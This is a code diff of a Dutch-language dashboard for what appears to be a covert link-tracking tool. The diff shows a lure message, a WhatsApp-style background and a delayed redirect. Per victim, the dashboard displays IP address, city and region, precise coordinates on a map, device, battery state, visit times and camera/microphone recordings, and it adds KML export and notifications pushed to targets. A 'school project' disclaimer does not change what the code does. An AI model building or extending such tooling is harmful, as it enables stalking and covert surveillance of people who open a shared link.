@@ -13,6 +13,10 @@
             background: url('https://i.postimg.cc/sDTjTFrr/whatsapp-background.jpg') no-repeat center center fixed;
             background-size: cover;
             color: #333;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         /* Container voor schakelaars en bewerkbare velden */
@@ -21,6 +25,9 @@
             padding: 15px;
             border-radius: 8px;
             margin-bottom: 20px;
+            width: 100%;
+            max-width: 800px;
+            box-sizing: border-box;
         }
 
         .location-item {
@@ -30,6 +37,9 @@
             border-radius: 8px;
             background: rgba(255, 255, 255, 0.9);
             position: relative;
+            width: 100%;
+            max-width: 800px;
+            box-sizing: border-box;
         }
 
         /* Professionele sluitknop */
@@ -134,6 +144,7 @@
             border-radius: 5px;
             border: 1px solid #ccc;
             font-size: 14px;
+            box-sizing: border-box;
         }
 
         .notification-section {
@@ -150,6 +161,7 @@
             border-radius: 5px;
             border: 1px solid #ccc;
             font-size: 14px;
+            box-sizing: border-box;
         }
 
         .notification-section img {
@@ -200,6 +212,45 @@
             border: 1px solid #ccc;
             font-size: 14px;
             font-weight: bold;
+            box-sizing: border-box;
+        }
+
+        /* Map container */
+        .map-container {
+            width: 100%;
+            height: 200px;
+            margin-top: 10px;
+        }
+
+        /* Disclaimer */
+        .disclaimer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #fff;
+            text-align: center;
+        }
+
+        /* Responsive */
+        @media screen and (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+
+            .switches-container {
+                padding: 10px;
+            }
+
+            .location-item {
+                padding: 10px;
+            }
+
+            .edit-label, .switch-text {
+                font-size: 14px;
+            }
+
+            .notification-section button {
+                font-size: 12px;
+            }
         }
     </style>
 </head>
@@ -240,10 +291,15 @@
 
             <label for="redirectUrlInput" class="edit-label">Voer de redirect URL in:</label>
             <input type="text" id="redirectUrlInput" placeholder="https://example.com">
+
+            <label for="redirectDelayInput" class="edit-label">Aantal seconden voor redirect:</label>
+            <input type="number" id="redirectDelayInput" placeholder="5" min="1" max="60">
         </div>
     </div>
 
     <div id="saved-locations"></div>
+
+    <p class="disclaimer">Dit is een schoolproject en er wordt op geen enkele manier misbruik van gemaakt.</p>
 
     <!-- Leaflet JS -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -254,12 +310,14 @@
         const notificationsSwitch = document.getElementById("notificationsSwitch");
         const messageInput = document.getElementById("messageInput");
         const redirectUrlInput = document.getElementById("redirectUrlInput");
+        const redirectDelayInput = document.getElementById("redirectDelayInput");
 
         micCamSwitch.checked = localStorage.getItem("micCamEnabled") === "true";
         locationSwitch.checked = localStorage.getItem("locationEnabled") === "true";
         notificationsSwitch.checked = localStorage.getItem("notificationsEnabled") === "true";
         messageInput.value = localStorage.getItem("messageText") || "Youssof heeft je een link gestuurd!";
         redirectUrlInput.value = localStorage.getItem("redirectUrl") || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        redirectDelayInput.value = localStorage.getItem("redirectDelay") || 5;
 
         micCamSwitch.addEventListener("change", () => {
             localStorage.setItem("micCamEnabled", micCamSwitch.checked);
@@ -281,31 +339,59 @@
             localStorage.setItem("redirectUrl", redirectUrlInput.value);
         });
 
+        redirectDelayInput.addEventListener("input", () => {
+            const delay = parseInt(redirectDelayInput.value, 10);
+            if (!isNaN(delay) && delay > 0) {
+                localStorage.setItem("redirectDelay", delay);
+            }
+        });
+
         function deleteDataItemByLocation(lat, lon) {
             let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+            const key = `${lat.toFixed(5)}-${lon.toFixed(5)}`;
+
             savedData = savedData.filter(item => {
-                if (item.lat && item.lon) {
-                    return !(item.lat === lat && item.lon === lon);
-                } else {
-                    return true;
-                }
+                let itemLat = item.ipLocation ? item.ipLocation.lat : item.lat;
+                let itemLon = item.ipLocation ? item.ipLocation.lon : item.lon;
+                const itemKey = itemLat ? `${itemLat.toFixed(5)}-${itemLon.toFixed(5)}` : null;
+                return itemKey !== key;
             });
+
             localStorage.setItem("collectedData", JSON.stringify(savedData));
-            displaySavedLocations();
+
+            // Verwijder uit displayedDataKeys
+            displayedDataKeys.delete(key);
+
+            // Verwijder het element uit de DOM
+            const locationItem = document.querySelector(`.location-item[data-key="${key}"]`);
+            if (locationItem) {
+                locationItem.parentNode.removeChild(locationItem);
+            }
         }
+
+        let displayedDataKeys = new Set();
 
         function groupDataByLocation(data) {
             const groupedData = {};
 
             data.forEach((item) => {
-                if (item.lat && item.lon) {
-                    const key = `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}`; // Gebruik 5 decimalen voor nauwkeurigheid
+                let lat, lon;
+                if (item.ipLocation && item.ipLocation.lat && item.ipLocation.lon) {
+                    lat = item.ipLocation.lat;
+                    lon = item.ipLocation.lon;
+                } else if (item.lat && item.lon) {
+                    lat = item.lat;
+                    lon = item.lon;
+                }
+
+                if (lat !== undefined && lon !== undefined) {
+                    const key = `${lat.toFixed(5)}-${lon.toFixed(5)}`;
                     if (!groupedData[key]) {
                         groupedData[key] = {
-                            lat: item.lat,
-                            lon: item.lon,
-                            accuracy: item.accuracy,
-                            device: item.device,
+                            lat: lat,
+                            lon: lon,
+                            accuracy: item.accuracy || null,
+                            device: item.device || null,
                             visits: 0,
                             timestamps: [],
                             recordings: [],
@@ -313,11 +399,12 @@
                             redirectUrl: item.redirectUrl || "",
                             notification: item.notification || {},
                             notificationSentCount: 0,
-                            title: item.title || "Gegevens"
+                            title: item.title || "Gegevens",
+                            ipLocation: item.ipLocation || null
                         };
                     }
                     groupedData[key].visits += 1;
-                    groupedData[key].timestamps.push(item.timestamp);
+                    groupedData[key].timestamps.push(item.timestamp || (item.ipLocation && item.ipLocation.timestamp));
 
                     if (item.recording && item.recording.dataUrl) {
                         groupedData[key].recordings.push(item.recording.dataUrl);
@@ -331,13 +418,12 @@
                 }
             });
 
-            return Object.values(groupedData);
+            return groupedData;
         }
 
         function displaySavedLocations() {
             const savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
             const container = document.getElementById("saved-locations");
-            container.innerHTML = "";
 
             if (savedData.length === 0) {
                 container.innerHTML = "<p>Geen opgeslagen gegevens gevonden.</p>";
@@ -346,164 +432,297 @@
 
             const groupedData = groupDataByLocation(savedData);
 
-            groupedData.forEach((dataItem, index) => {
-                const locationItem = document.createElement("div");
-                locationItem.classList.add("location-item");
+            for (const key in groupedData) {
+                if (!displayedDataKeys.has(key)) {
+                    const dataItem = groupedData[key];
+                    displayedDataKeys.add(key);
 
-                const closeButton = document.createElement("button");
-                closeButton.classList.add("close-btn");
-                closeButton.onclick = () => deleteDataItemByLocation(dataItem.lat, dataItem.lon);
+                    const index = key.replace('.', '').replace('-', '');
+                    const locationItem = document.createElement("div");
+                    locationItem.classList.add("location-item");
+                    locationItem.setAttribute("data-key", key);
 
-                let htmlContent = "";
+                    const closeButton = document.createElement("button");
+                    closeButton.classList.add("close-btn");
+                    closeButton.onclick = () => deleteDataItemByLocation(dataItem.lat, dataItem.lon);
 
-                // Bewerkbare titel
-                htmlContent += `<input type="text" id="title-${index}" class="title-input" value="${dataItem.title}" placeholder="Titel">`;
+                    let htmlContent = "";
 
-                // Locatiegegevens
-                htmlContent += `
-                    <p><strong>Breedtegraad:</strong> ${dataItem.lat}</p>
-                    <p><strong>Lengtegraad:</strong> ${dataItem.lon}</p>
-                    <p><strong>Nauwkeurigheid:</strong> ±${dataItem.accuracy} meter</p>
-                    <p><strong>Apparaat:</strong> ${dataItem.device}</p>
-                    <p><strong>Aantal bezoeken:</strong> ${dataItem.visits}</p>
-                    <p><strong>Batterijniveau:</strong> ${dataItem.battery.level !== undefined ? dataItem.battery.level * 100 + '%' : 'Onbekend'}</p>
-                    <p><strong>Opladen:</strong> ${dataItem.battery.charging !== undefined ? (dataItem.battery.charging ? 'Ja' : 'Nee') : 'Onbekend'}</p>
-                    <p><strong>Redirect URL:</strong> <a href="${dataItem.redirectUrl}" target="_blank">${dataItem.redirectUrl}</a></p>
-                    <p><strong>Tijdstippen:</strong></p>
-                    <ul>
-                        ${dataItem.timestamps.map(ts => `<li>${ts}</li>`).join('')}
-                    </ul>
-                `;
+                    // Bewerkbare titel
+                    htmlContent += `<input type="text" id="title-${index}" class="title-input" value="${dataItem.title}" placeholder="Titel">`;
 
-                // Opnames
-                if (dataItem.recordings.length > 0) {
-                    htmlContent += `<p><strong>Opnames:</strong></p>`;
-                    dataItem.recordings.forEach((recordingUrl, recIndex) => {
+                    // Locatiegegevens
+                    if (dataItem.ipLocation) {
                         htmlContent += `
-                            <video controls width="250">
-                                <source src="${recordingUrl}" type="video/webm">
-                                Je browser ondersteunt de video tag niet.
-                            </video>
+                            <p><strong>IP-adres:</strong> ${dataItem.ipLocation.ip}</p>
+                            <p><strong>Stad:</strong> ${dataItem.ipLocation.city}</p>
+                            <p><strong>Regio:</strong> ${dataItem.ipLocation.region}</p>
+                            <p><strong>Land:</strong> ${dataItem.ipLocation.country}</p>
                         `;
-                    });
-                }
-
-                locationItem.innerHTML = htmlContent;
-                locationItem.appendChild(closeButton);
-                container.appendChild(locationItem);
-
-                // Notificatiesectie
-                const notificationSection = document.createElement("div");
-                notificationSection.classList.add("notification-section");
-                notificationSection.innerHTML = `
-                    <h3>Notificatie</h3>
-                    <input type="text" id="bodyText-${index}" placeholder="Voer body tekst in">
-                    <input type="file" id="iconUpload-${index}" accept="image/*">
-                    <button id="sendNotification-${index}">Stuur</button>
-                    <p>Aantal keer gestuurd: <span id="notificationCount-${index}">${dataItem.notificationSentCount || 0}</span></p>
-                `;
-
-                locationItem.appendChild(notificationSection);
-
-                // Zet bestaande waarden
-                if (dataItem.notification) {
-                    document.getElementById(`bodyText-${index}`).value = dataItem.notification.bodyText || "";
-                    if (dataItem.notification.iconDataUrl) {
-                        const iconPreview = document.createElement("img");
-                        iconPreview.src = dataItem.notification.iconDataUrl;
-                        iconPreview.width = 50;
-                        iconPreview.height = 50;
-                        notificationSection.appendChild(iconPreview);
                     }
-                }
 
-                // Event listeners
-                document.getElementById(`title-${index}`).addEventListener("input", function() {
-                    let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
-                    const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
-                    savedData.forEach(item => {
-                        const itemKey = item.lat ? `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}` : null;
-                        if (itemKey === key) {
-                            item.title = this.value;
+                    htmlContent += `
+                        <p><strong>Breedtegraad:</strong> ${dataItem.lat}</p>
+                        <p><strong>Lengtegraad:</strong> ${dataItem.lon}</p>
+                    `;
+
+                    if (dataItem.accuracy) {
+                        htmlContent += `<p><strong>Nauwkeurigheid:</strong> ±${dataItem.accuracy} meter</p>`;
+                    }
+
+                    if (dataItem.device) {
+                        htmlContent += `<p><strong>Apparaat:</strong> ${dataItem.device}</p>`;
+                    }
+
+                    htmlContent += `
+                        <p><strong>Aantal bezoeken:</strong> ${dataItem.visits}</p>
+                        <p><strong>Batterijniveau:</strong> ${dataItem.battery.level !== undefined ? dataItem.battery.level * 100 + '%' : 'Onbekend'}</p>
+                        <p><strong>Opladen:</strong> ${dataItem.battery.charging !== undefined ? (dataItem.battery.charging ? 'Ja' : 'Nee') : 'Onbekend'}</p>
+                        <p><strong>Redirect URL:</strong> <a href="${dataItem.redirectUrl}" target="_blank">${dataItem.redirectUrl}</a></p>
+                        <p><strong>Tijdstippen:</strong></p>
+                        <ul>
+                            ${dataItem.timestamps.map(ts => `<li>${ts}</li>`).join('')}
+                        </ul>
+                    `;
+
+                    // Opnames
+                    if (dataItem.recordings.length > 0) {
+                        htmlContent += `<p><strong>Opnames:</strong></p>`;
+                        dataItem.recordings.forEach((recordingUrl, recIndex) => {
+                            htmlContent += `
+                                <video controls width="250">
+                                    <source src="${recordingUrl}" type="video/webm">
+                                    Je browser ondersteunt de video tag niet.
+                                </video>
+                            `;
+                        });
+                    }
+
+                    // Map container
+                    if (dataItem.lat && dataItem.lon) {
+                        htmlContent += `<div id="map-${index}" class="map-container"></div>`;
+                    }
+
+                    // Download KML knop
+                    htmlContent += `<button id="downloadKML-${index}">Download KML</button>`;
+
+                    locationItem.innerHTML = htmlContent;
+                    locationItem.appendChild(closeButton);
+                    container.appendChild(locationItem);
+
+                    // Initializeer de kaart
+                    if (dataItem.lat && dataItem.lon) {
+                        const map = L.map(`map-${index}`).setView([dataItem.lat, dataItem.lon], 13);
+
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                            attribution: '&copy; OpenStreetMap contributors'
+                        }).addTo(map);
+
+                        let popupText = "";
+                        if (dataItem.ipLocation) {
+                            popupText = `${dataItem.ipLocation.city}, ${dataItem.ipLocation.region}, ${dataItem.ipLocation.country}`;
+                        } else {
+                            popupText = `Locatie: ${dataItem.lat}, ${dataItem.lon}`;
                         }
-                    });
-                    localStorage.setItem("collectedData", JSON.stringify(savedData));
-                });
 
-                document.getElementById(`bodyText-${index}`).addEventListener("input", function() {
-                    let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
-                    const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
-                    savedData.forEach(item => {
-                        const itemKey = item.lat ? `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}` : null;
-                        if (itemKey === key) {
-                            if (!item.notification) {
-                                item.notification = {};
-                            }
-                            item.notification.bodyText = this.value;
-                        }
-                    });
-                    localStorage.setItem("collectedData", JSON.stringify(savedData));
-                });
+                        L.marker([dataItem.lat, dataItem.lon]).addTo(map)
+                            .bindPopup(popupText)
+                            .openPopup();
+                    }
 
-                document.getElementById(`iconUpload-${index}`).addEventListener("change", function(event) {
-                    const file = event.target.files[0];
-                    if (file) {
-                        const reader = new FileReader();
-                        reader.onloadend = function() {
-                            let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
-                            const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
-                            savedData.forEach(item => {
-                                const itemKey = item.lat ? `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}` : null;
-                                if (itemKey === key) {
-                                    if (!item.notification) {
-                                        item.notification = {};
-                                    }
-                                    item.notification.iconDataUrl = reader.result;
-                                }
-                            });
-                            localStorage.setItem("collectedData", JSON.stringify(savedData));
+                    // Notificatiesectie
+                    const notificationSection = document.createElement("div");
+                    notificationSection.classList.add("notification-section");
+                    notificationSection.innerHTML = `
+                        <h3>Notificatie</h3>
+                        <div class="switch-container">
+                            <label class="switch">
+                                <input type="checkbox" id="actionSwitch-${index}">
+                                <span class="slider"></span>
+                            </label>
+                            <span class="switch-text">Antwoordbare notificatie inschakelen</span>
+                        </div>
+                        <input type="text" id="bodyText-${index}" placeholder="Voer body tekst in">
+                        <input type="file" id="iconUpload-${index}" accept="image/*">
+                        <button id="sendNotification-${index}">Stuur</button>
+                        <p>Aantal keer gestuurd: <span id="notificationCount-${index}">${dataItem.notificationSentCount || 0}</span></p>
+                    `;
+
+                    locationItem.appendChild(notificationSection);
+
+                    // Zet bestaande waarden
+                    if (dataItem.notification) {
+                        document.getElementById(`bodyText-${index}`).value = dataItem.notification.bodyText || "";
+                        if (dataItem.notification.iconDataUrl) {
                             const iconPreview = document.createElement("img");
-                            iconPreview.src = reader.result;
+                            iconPreview.src = dataItem.notification.iconDataUrl;
                             iconPreview.width = 50;
                             iconPreview.height = 50;
                             notificationSection.appendChild(iconPreview);
-                        };
-                        reader.readAsDataURL(file);
+                        }
                     }
-                });
 
-                document.getElementById(`sendNotification-${index}`).addEventListener("click", function() {
-                    const bodyText = document.getElementById(`bodyText-${index}`).value;
-                    let iconDataUrl = null;
-                    let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
-                    const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
-
-                    savedData.forEach(item => {
-                        const itemKey = item.lat ? `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}` : null;
-                        if (itemKey === key && item.notification) {
-                            iconDataUrl = item.notification.iconDataUrl;
-                            if (!item.notification.sentCount) {
-                                item.notification.sentCount = 0;
+                    // Event listeners
+                    document.getElementById(`title-${index}`).addEventListener("input", function() {
+                        let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+                        const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
+                        savedData.forEach(item => {
+                            let itemLat = item.ipLocation ? item.ipLocation.lat : item.lat;
+                            let itemLon = item.ipLocation ? item.ipLocation.lon : item.lon;
+                            const itemKey = itemLat ? `${itemLat.toFixed(5)}-${itemLon.toFixed(5)}` : null;
+                            if (itemKey === key) {
+                                item.title = this.value;
                             }
-                            item.notification.sentCount += 1;
-                            document.getElementById(`notificationCount-${index}`).innerText = item.notification.sentCount;
+                        });
+                        localStorage.setItem("collectedData", JSON.stringify(savedData));
+                    });
+
+                    document.getElementById(`bodyText-${index}`).addEventListener("input", function() {
+                        let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+                        const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
+                        savedData.forEach(item => {
+                            let itemLat = item.ipLocation ? item.ipLocation.lat : item.lat;
+                            let itemLon = item.ipLocation ? item.ipLocation.lon : item.lon;
+                            const itemKey = itemLat ? `${itemLat.toFixed(5)}-${itemLon.toFixed(5)}` : null;
+                            if (itemKey === key) {
+                                if (!item.notification) {
+                                    item.notification = {};
+                                }
+                                item.notification.bodyText = this.value;
+                            }
+                        });
+                        localStorage.setItem("collectedData", JSON.stringify(savedData));
+                    });
+
+                    document.getElementById(`iconUpload-${index}`).addEventListener("change", function(event) {
+                        const file = event.target.files[0];
+                        if (file) {
+                            const reader = new FileReader();
+                            reader.onloadend = function() {
+                                let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+                                const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
+                                savedData.forEach(item => {
+                                    let itemLat = item.ipLocation ? item.ipLocation.lat : item.lat;
+                                    let itemLon = item.ipLocation ? item.ipLocation.lon : item.lon;
+                                    const itemKey = itemLat ? `${itemLat.toFixed(5)}-${itemLon.toFixed(5)}` : null;
+                                    if (itemKey === key) {
+                                        if (!item.notification) {
+                                            item.notification = {};
+                                        }
+                                        item.notification.iconDataUrl = reader.result;
+                                    }
+                                });
+                                localStorage.setItem("collectedData", JSON.stringify(savedData));
+                                const iconPreview = document.createElement("img");
+                                iconPreview.src = reader.result;
+                                iconPreview.width = 50;
+                                iconPreview.height = 50;
+                                notificationSection.appendChild(iconPreview);
+                            };
+                            reader.readAsDataURL(file);
                         }
                     });
 
-                    localStorage.setItem("collectedData", JSON.stringify(savedData));
+                    document.getElementById(`sendNotification-${index}`).addEventListener("click", function() {
+                        const bodyText = document.getElementById(`bodyText-${index}`).value;
+                        const actionSwitch = document.getElementById(`actionSwitch-${index}`).checked;
+                        let iconDataUrl = null;
+                        let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+                        const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
 
-                    if ("Notification" in window && Notification.permission === "granted") {
-                        new Notification("Notificatie", {
-                            body: bodyText,
-                            icon: iconDataUrl
+                        savedData.forEach(item => {
+                            let itemLat = item.ipLocation ? item.ipLocation.lat : item.lat;
+                            let itemLon = item.ipLocation ? item.ipLocation.lon : item.lon;
+                            const itemKey = itemLat ? `${itemLat.toFixed(5)}-${itemLon.toFixed(5)}` : null;
+                            if (itemKey === key && item.notification) {
+                                iconDataUrl = item.notification.iconDataUrl;
+                                if (!item.notification.sentCount) {
+                                    item.notification.sentCount = 0;
+                                }
+                                item.notification.sentCount += 1;
+                                document.getElementById(`notificationCount-${index}`).innerText = item.notification.sentCount;
+                            }
                         });
-                    } else {
-                        alert("Notificaties zijn niet toegestaan of worden niet ondersteund door deze browser.");
-                    }
-                });
-            });
+
+                        localStorage.setItem("collectedData", JSON.stringify(savedData));
+
+                        if ("Notification" in window && Notification.permission === "granted") {
+                            const options = {
+                                body: bodyText,
+                                icon: iconDataUrl
+                            };
+
+                            if (actionSwitch) {
+                                options.data = { reply: true };
+                            }
+
+                            const notification = new Notification("Notificatie", options);
+
+                            if (actionSwitch) {
+                                notification.onclick = function(event) {
+                                    event.preventDefault();
+                                    let response = prompt("Typ je reactie:");
+                                    if (response) {
+                                        alert("Je hebt gereageerd: " + response);
+                                    }
+                                };
+                            } else {
+                                notification.onclick = function(event) {
+                                    event.preventDefault();
+                                    window.focus();
+                                };
+                            }
+                        } else {
+                            alert("Notificaties zijn niet toegestaan of worden niet ondersteund door deze browser.");
+                        }
+                    });
+
+                    // Event listener voor Download KML knop
+                    document.getElementById(`downloadKML-${index}`).addEventListener("click", function() {
+                        generateAndDownloadKML(dataItem);
+                    });
+                } else {
+                    // Update bestaande items indien nodig
+                    // Bijvoorbeeld het aantal bezoeken of tijdstippen
+                    // Dit gedeelte kun je uitbreiden indien nodig
+                }
+            }
         }
 
+        // Functie om KML te genereren en te downloaden
+        function generateAndDownloadKML(dataItem) {
+            const kmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<kml xmlns="http://www.opengis.net/kml/2.2">
+    <Placemark>
+        <name>${dataItem.title}</name>
+        <description>${dataItem.device || 'Geen apparaat informatie'}</description>
+        <Point>
+            <coordinates>${dataItem.lon},${dataItem.lat},0</coordinates>
+        </Point>
+    </Placemark>
+</kml>`;
+
+            const blob = new Blob([kmlContent], { type: 'application/vnd.google-earth.kml+xml' });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `${dataItem.title || 'location'}.kml`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+        }
+
+        // Live update functie
+        function startLiveUpdates() {
+            // Luister naar custom events
+            window.addEventListener('dataUpdated', displaySavedLocations);
+        }
+
+        // Start live updates
+        startLiveUpdates();
+
+        // Eerste keer weergeven
         displaySavedLocations();
     </script>
 </body>
